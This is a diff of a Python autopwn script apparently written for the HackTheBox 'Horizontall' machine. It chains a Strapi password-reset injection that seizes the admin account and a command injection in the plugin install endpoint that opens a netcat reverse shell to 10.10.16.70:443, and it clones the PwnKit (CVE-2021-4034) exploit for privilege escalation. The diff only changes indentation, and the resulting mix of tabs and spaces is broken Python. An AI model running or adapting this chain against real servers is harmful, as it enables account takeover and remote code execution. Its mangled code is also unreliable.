@@ -32,59 +32,59 @@ signal.signal(signal.SIGINT, def_handler)
 
 class Exploit:
 
-	def __init__(self, main_url, password, filename):
+    def __init__(self, main_url, password, filename):
 
-		self.url = main_url
-		self.password = password
-		self.filename = filename
+        self.url = main_url
+	self.password = password
+	self.filename = filename
 
-	def zip_file(self):
-		os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
-		git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
-		cwd = os.getcwd()
-		shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)
+    def zip_file(self):
+	os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
+	git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
+	cwd = os.getcwd()
+	shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)
 
-	def reset_password(self):
+    def reset_password(self):
 
-		s = requests.session()
-		s.verify = False
-		urllib3.disable_warnings()
+	s = requests.session()
+	s.verify = False
+	urllib3.disable_warnings()
 
-		p1 = log.progress('Password')
+	p1 = log.progress('Password')
 
-		data_password = {
-			'code': {'$gt':0},
-			'password': self.password,
-			'passwordConfirmation': self.password
-		}
+	data_password = {
+		'code': {'$gt':0},
+		'password': self.password,
+		'passwordConfirmation': self.password
+	}
 
-		r = s.post(self.url+'/admin/auth/reset-password', json=data_password).text
+	r = s.post(self.url+'/admin/auth/reset-password', json=data_password).text
 
-		response = json.loads(r)
-		global jwt
+	response = json.loads(r)
+	global jwt
 
-		jwt = response['jwt']
+	jwt = response['jwt']
 
-		if 'jwt' not in r:
-			p1.failure('Not changed password')
-			sys.exit(1)
-		else:
-			p1.success(f'[Changed password] username admin and password {self.password}')
+	if 'jwt' not in r:
+		p1.failure('Not changed password')
+		sys.exit(1)
+	else:
+		p1.success(f'[Changed password] username admin and password {self.password}')
 
-	def rce_starpi(self):
+    def rce_starpi(self):
 
-		header = { 'Authorization': f'Bearer {jwt}' }
+	header = { 'Authorization': f'Bearer {jwt}' }
 		
-		# Cambiar IP por la vuestra
+	# Cambiar IP por la vuestra
 
-		data_plugin = {
-			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.70 443 >/tmp/f)',
-			'port': '1337'
-		}
+	data_plugin = {
+		'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.70 443 >/tmp/f)',
+		'port': '1337'
+	}
 
-		r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)
+	r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)
 
-		print(r.text)
+	print(r.text)
 
 autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')
 
